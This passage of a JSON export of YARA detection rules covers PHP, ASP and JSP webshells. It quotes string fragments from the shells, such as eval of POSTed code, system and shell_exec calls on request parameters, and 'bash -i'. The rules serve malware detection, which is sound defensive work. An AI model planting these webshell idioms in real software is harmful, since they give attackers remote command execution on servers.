mVersion=\" \n   condition: \n      all of them\n}","date":"2014-04-06 13:59:11","description":"Webshells Auto-generated - file config.asp","minimum_yara":"1.7","name":"Webshell_HYTop_DevPack_config_RID324C","reference":"-","required_modules":[],"rule_hash":"5000cb7793cb1336167fb210c3fc98e4","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_zehir4_RID2F15 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file zehir4.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \" byMesaj \" \n   condition: \n      all of them\n}","date":"2014-04-06 11:42:01","description":"Webshells Auto-generated - file zehir4.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_zehir4_RID2F15","reference":"-","required_modules":[],"rule_hash":"6036c962adcbbd0dee59eef1f437150f","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_iMHaPFtp_RID2D7F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file iMHaPFtp.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:34:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"\\\\t<th class=\\\\\\\"permission_header\\\\\\\"><a href=\\\\\\\"$self?{$d}sort=permission$r\\\\\\\">\" \n   condition: \n      all of them\n}","date":"2014-04-06 10:34:21","description":"Webshells Auto-generated - file iMHaPFtp.php","minimum_yara":"1.7","name":"Webshell_iMHaPFtp_RID2D7F","reference":"-","required_modules":[],"rule_hash":"9a23329aef398de1643cafc6d0d80770","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Unpack_TBack_RID2F2C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file TBack.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"\\\\final\\\\new\\\\lcc\\\\public.dll\" \n   condition: \n      all of them\n}","date":"2014-04-06 11:45:51","description":"Webshells Auto-generated - file TBack.dll","minimum_yara":"1.7","name":"Webshell_Unpack_TBack_RID2F2C","reference":"-","required_modules":[],"rule_hash":"66c8120ded1dddd71d7079603591c3e2","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_STNC_WebShell_v0_8_RID30CF : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file STNC WebShell v0.8.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:55:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"if(isset($_POST[\\\"action\\\"])) $action = $_POST[\\\"action\\\"];\" fullword\n      $s8 = \"elseif(fe(\\\"system\\\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()\" \n      $s13 = \"{ $pwd = $_POST[\\\"pwd\\\"]; $type = filetype($pwd); if($type === \\\"dir\\\")chdir($pw\" \n   condition: \n      2 of them\n}","date":"2014-04-06 12:55:41","description":"PHP Webshells Github Archive - file STNC WebShell v0.8.php","minimum_yara":"1.7","name":"WebShell_STNC_WebShell_v0_8_RID30CF","reference":"-","required_modules":[],"rule_hash":"ab5472327886e9dd3e280c8e256641bb","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_Web_shell__c_ShAnKaR_RID3203 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 13:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"header(\\\"Content-Length: \\\".filesize($_POST['downf']));\" fullword\n      $s5 = \"if($_POST['save']==0){echo \\\"<textarea cols=70 rows=10>\\\".htmlspecialchars($dump\" \n      $s6 = \"write(\\\"#\\\\n#Server : \\\".getenv('SERVER_NAME').\\\"\" fullword\n      $s12 = \"foreach(@file($_POST['passwd']) as $fed)echo $fed;\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 13:47:01","description":"PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php","minimum_yara":"1.7","name":"WebShell_Web_shell__c_ShAnKaR_RID3203","reference":"-","required_modules":[],"rule_hash":"1be444895c6ed1492cefa380b4135441","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_Gamma_Web_Shell_RID303D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file Gamma Web Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];\" fullword\n      $s8 = \"### Gamma Group <http://www.gammacenter.com>\" fullword\n      $s15 = \"my $error = \\\"This command is not available in the restricted mode.\\\\n\\\";\" fullword\n      $s20 = \"my $command = $self->query('command');\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 12:31:21","description":"PHP Webshells Github Archive - file Gamma Web Shell.php","minimum_yara":"1.7","name":"WebShell_Gamma_Web_Shell_RID303D","reference":"-","required_modules":[],"rule_hash":"3390f06d8f9fef10316ccef5b362ec94","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_php_webshells_aspydrv_RID335E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file aspydrv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Target = \\\"D:\\\\hshome\\\\masterhr\\\\masterhr.com\\\\\\\"  ' ---Directory to which files\" \n      $s1 = \"nPos = InstrB(nPosEnd, biData, CByteString(\\\"Content-Type:\\\"))\" fullword\n      $s3 = \"Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1\" fullword\n      $s17 = \"If request.querystring(\\\"getDRVs\\\")=\\\"@\\\" then\" fullword\n      $s20 = \"' ---Copy Too Folder routine Start\" fullword\n   condition: \n      3 of them\n}","date":"2014-04-06 14:44:51","description":"PHP Webshells Github Archive - file aspydrv.php","minimum_yara":"1.7","name":"WebShell_php_webshells_aspydrv_RID335E","reference":"-","required_modules":[],"rule_hash":"1de71ea788ef65c400eb65f56095f019","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_JspWebshell_1_2_2_RID309B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file JspWebshell 1.2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"System.out.println(\\\"CreateAndDeleteFolder is error:\\\"+ex); \" fullword\n      $s3 = \"<%@ page contentType=\\\"text/html; charset=GBK\\\" language=\\\"java\\\" import=\\\"java.\" \n      $s4 = \"// String tempfilepath=request.getParameter(\\\"filepath\\\");\" fullword\n      $s15 = \"endPoint=random1.getFilePointer();\" fullword\n      $s20 = \"if (request.getParameter(\\\"command\\\") != null) {\" fullword\n   condition: \n      3 of them\n}","date":"2014-04-06 12:47:01","description":"PHP Webshells Github Archive - file JspWebshell 1.2.php","minimum_yara":"1.7","name":"WebShell_JspWebshell_1_2_2_RID309B","reference":"-","required_modules":[],"rule_hash":"ccd78f40cfeed86744c5e2f821a177d5","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_g00nshell_v1_3_RID2F6B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file g00nshell-v1.3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s10 = \"#To execute commands, simply include ?cmd=___ in the url. #\" fullword\n      $s15 = \"$query = \\\"SHOW COLUMNS FROM \\\" . $_GET['table'];\" fullword\n      $s16 = \"$uakey = \\\"724ea055b975621b9d679f7077257bd9\\\"; // MD5 encoded user-agent\" fullword\n      $s17 = \"echo(\\\"<form method='GET' name='shell'>\\\");\" fullword\n      $s18 = \"echo(\\\"<form method='post' action='?act=sql'>\\\");\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 11:56:21","description":"PHP Webshells Github Archive - file g00nshell-v1.3.php","minimum_yara":"1.7","name":"WebShell_g00nshell_v1_3_RID2F6B","reference":"-","required_modules":[],"rule_hash":"f66a86c6e276f855b810f867af02d514","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_DarkSpy105_RID2DFA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file DarkSpy105.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"Sorry,DarkSpy got an unknown exception,please re-run it,thanks!\" \n   condition: \n      all of them\n}","date":"2014-04-06 10:54:51","description":"Webshells Auto-generated - file DarkSpy105.exe","minimum_yara":"1.7","name":"Webshell_DarkSpy105_RID2DFA","reference":"-","required_modules":[],"rule_hash":"34bd97e8d696022dd48e695db79efda0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_reader_RID2F32 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file reader.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"mailto:mailbomb@hotmail.\" \n   condition: \n      all of them\n}","date":"2014-04-06 11:46:51","description":"Webshells Auto-generated - file reader.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_reader_RID2F32","reference":"-","required_modules":[],"rule_hash":"4fbc0337997085cbfba8cc612b98cbfb","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_KA_uShell_RID2DFE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file KA_uShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass\" \n      $s6 = \"if ($_POST['path']==\\\"\\\"){$uploadfile = $_FILES['file']['name'];}\" \n   condition: \n      all of them\n}","date":"2014-04-06 10:55:31","description":"Webshells Auto-generated - file KA_uShell.php","minimum_yara":"1.7","name":"Webshell_KA_uShell_RID2DFE","reference":"-","required_modules":[],"rule_hash":"0458e512995804b4b6d6e31fa7ea7972","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_php_include_w_shell_RID325E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file php-include-w-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:02:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s13 = \"# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!\" fullword\n      $s17 = \"\\\"phpshellapp\\\" => \\\"export TERM=xterm; bash -i\\\",\" fullword\n      $s19 = \"else if($numhosts == 1) $strOutput .= \\\"On 1 host..\\\\n\\\";\" fullword\n   condition: \n      1 of them\n}","date":"2014-04-06 14:02:11","description":"PHP Webshells Github Archive - file php-include-w-shell.php","minimum_yara":"1.7","name":"WebShell_php_include_w_shell_RID325E","reference":"-","required_modules":[],"rule_hash":"6a3fc7dd69e02b6bcb18546557ba34f9","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_PhpSpy_Ver_2006_RID2F9D : DEMO T1007 T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file PhpSpy Ver 2006.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1007, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"var_dump(@$shell->RegRead($_POST['readregname']));\" fullword\n      $s12 = \"$prog = isset($_POST['prog']) ? $_POST['prog'] : \\\"/c net start > \\\".$pathname.\" \n      $s19 = \"$program = isset($_POST['program']) ? $_POST['program'] : \\\"c:\\\\winnt\\\\system32\" \n      $s20 = \"$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\\\winnt\\\\backdoor.exe'\" \n   condition: \n      1 of them\n}","date":"2014-04-06 12:04:41","description":"PHP Webshells Github Archive - file PhpSpy Ver 2006.php","minimum_yara":"1.7","name":"WebShell_PhpSpy_Ver_2006_RID2F9D","reference":"-","required_modules":[],"rule_hash":"dd634e5b2f407e7624642f3e97df675f","score":75,"tags":["T1100","DEMO","WEBSHELL","T1007"]},{"author":"Florian Roth","content":"rule WebShell_ZyklonShell_RID2F05 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file ZyklonShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>\" fullword\n      $s1 = \"<!DOCTYPE HTML PUBLIC \\\"-//IETF//DTD HTML 2.0//EN\\\">\" fullword\n      $s2 = \"<TITLE>404 Not Found</TITLE>\" fullword\n      $s3 = \"<H1>Not Found</H1>\" fullword\n   condition: \n      all of them\n}","date":"2014-04-06 11:39:21","description":"PHP Webshells Github Archive - file ZyklonShell.php","minimum_yara":"1.7","name":"WebShell_ZyklonShell_RID2F05","reference":"-","required_modules":[],"rule_hash":"19617f2e9555dc4c63a129d416bb9ee7","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_php_webshells_myshell_RID3353 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file myshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if($ok==false &&$status && $autoErrorTrap)system($command . \\\" 1> /tmp/outpu\" \n      $s5 = \"system($command . \\\" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o\" \n      $s15 = \"<title>$MyShellVersion - Access Denied</title>\" fullword\n      $s16 = \"}$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = $_SERVER['HTT\" \n   condition: \n      1 of them\n}","date":"2014-04-06 14:43:01","description":"PHP Webshells Github Archive - file myshell.php","minimum_yara":"1.7","name":"WebShell_php_webshells_myshell_RID3353","reference":"-","required_modules":[],"rule_hash":"75e0996064865a8ec052a2b05bff3e11","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_simple_cmd_RID2EA3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file simple_cmd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:23:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input type=TEXT name=\\\"-cmd\\\" size=64 value=\\\"<?=$cmd?>\\\" \" fullword\n      $s2 = \"<title>G-Security Webshell</title>\" fullword\n      $s4 = \"<? if($cmd != \\\"\\\") print Shell_Exec($cmd);?>\" fullword\n      $s6 = \"<? $cmd = $_REQUEST[\\\"-cmd\\\"];?>\" fullword\n   condition: \n      1 of them\n}","date":"2014-04-06 11:23:01","description":"PHP Webshells Github Archive - file simple_cmd.php","minimum_yara":"1.7","name":"WebShell_simple_cmd_RID2EA3","reference":"-","required_modules":[],"rule_hash":"6a1955be5f07a7f80089c9f743c2b97d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_aZRaiLPhp_v1_0_RID2F66 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file aZRaiLPhp v1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED\" \n      $s4 = \"$fileperm=base_convert($_POST['fileperm'],8,10);\" fullword\n      $s19 = \"touch (\\\"$path/$dismi\\\") or die(\\\"Dosya Olu\" fullword\n      $s20 = \"echo \\\"<div align=left><a href='./$this_file?dir=$path/$file'>G\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 11:55:31","description":"PHP Webshells Github Archive - file aZRaiLPhp v1.0.php","minimum_yara":"1.7","name":"WebShell_aZRaiLPhp_v1_0_RID2F66","reference":"-","required_modules":[],"rule_hash":"50fe95b80de17f2fb09385ee3f090c53","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_Backdoor_v1_RID3018 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PHP Backdoor v1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:25:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"echo\\\"<form method=\\\\\\\"POST\\\\\\\" action=\\\\\\\"\\\".$_SERVER['PHP_SELF'].\\\"?edit=\\\".$th\" \n      $s8 = \"echo \\\"<a href=\\\\\\\"\\\".$_SERVER['PHP_SELF'].\\\"?proxy\" \n   condition: \n      all of them\n}","date":"2014-04-06 12:25:11","description":"Webshells Auto-generated - file PHP Backdoor v1.php","minimum_yara":"1.7","name":"Webshell_PHP_Backdoor_v1_RID3018","reference":"-","required_modules":[],"rule_hash":"bacfcf30031b1374cd49f6941b27b911","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule HYTop_DevPack_server_RID2ED8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file server.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- PageServer Below -->\" \n   condition: \n      all of them\n}","date":"2014-04-06 11:31:51","description":"Webshells Auto-generated - file server.asp","minimum_yara":"1.7","name":"HYTop_DevPack_server_RID2ED8","reference":"-","required_modules":[],"rule_hash":"25db6785ca701d752af51049eda12e19","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule saphpshell_RID2B45 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file saphpshell_RID2B45.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 08:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<td><input type=\\\"text\\\" name=\\\"command\\\" size=\\\"60\\\" value=\\\"<?=$_POST['command']?>\" \n   condition: \n      all of them\n}","date":"2014-04-06 08:59:21","description":"Webshells Auto-generated - file saphpshell.php","minimum_yara":"1.7","name":"saphpshell_RID2B45","reference":"-","required_modules":[],"rule_hash":"95a9d2ad334d2794635c07fc0cd88bdc","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0__RID3B1A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 20:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \" <a href=\\\"http://www.cyberlords.net\\\" target=\\\"_blank\\\">Cyber Lords Community</\" \n      $s10 = \"echo \\\"<meta http-equiv=Refresh content=\\\\\\\"0; url=$PHP_SELF?edit=$nameoffile&sh\" \n      $s11 = \" *   Coded by Pixcher\" fullword\n      $s16 = \"<input type=text size=55 name=newfile value=\\\"$d/newfile.php\\\">\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 20:14:51","description":"PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php","minimum_yara":"1.7","name":"WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0__RID3B1A","reference":"-","required_modules":[],"rule_hash":"0a46120152c6af42c60ccde83aa09771","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_Generic_PHP_7_RID2F20 : DEMO GEN T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"header(\\\"Content-disposition: filename=$filename.sql\\\");\" fullword\n      $s1 = \"else if( $action == \\\"dumpTable\\\" || $action == \\\"dumpDB\\\" ) {\" fullword\n      $s2 = \"echo \\\"<font color=blue>[$USERNAME]</font> - \\\\n\\\";\" fullword\n      $s4 = \"if( $action == \\\"dumpTable\\\" )\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 11:43:51","description":"PHP Webshells Github Archive","minimum_yara":"1.7","name":"WebShell_Generic_PHP_7_RID2F20","reference":"-","required_modules":[],"rule_hash":"3a953b96dd0ff9d07129854dc554ffb5","score":75,"tags":["T1100","DEMO","WEBSHELL","GEN"]},{"author":"Florian Roth","content":"rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall_RID3C61 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 21:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if(!$result2)$dump_file.='#error table '.$rows[0];\" fullword\n      $s4 = \"if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');\" fullword\n      $s6 = \"header('Content-Length: '.strlen($dump_file).\\\"\\\\n\\\");\" fullword\n      $s20 = \"echo('Dump for '.$db_dump.' now in '.$to_file);\" fullword\n   condition: \n      2 of them\n}","date":"2014-04-06 21:09:21","description":"PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php","minimum_yara":"1.7","name":"WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall_RID3C61","reference":"-","required_modules":[],"rule_hash":"83db1a6fff21310afa749d817523db08","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell__findsock_php_findsock_shell_php_reverse_shell_RID3D7D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 21:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"// me at pentestmonkey@pentestmonkey.net\" fullword\n   condition: \n      all of them\n}","date":"2014-04-06 21:56:41","description":"PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php","minimum_yara":"1.7","name":"WebShell__findsock_php_findsock_shell_php_reverse_shell_RID3D7D","reference":"-","required_modules":[],"rule_hash":"b5c5705c3dc1e33c9f8a12f6dcde3c14","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule WebShell_Generic_PHP_6_RID2F1F : DEMO GEN T1100 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:43:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"@eval(stripslashes($_POST['phpcode']));\" fullword\n      $s5 = \"echo shell_exec($com);\" fullword\n      $s7 = \"if($sertype == \\\"winda\\\"){\" fullword\n      $s8 = \"function execute($com)\" fullword\n      $s12 = \"echo decode(execute($cmd));\" fullword\n      $s15 = \"echo system($com);\" fullword\n   condition: \n      4 of them\n}","date":"2014-04-06 11:43:41","description":"PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, 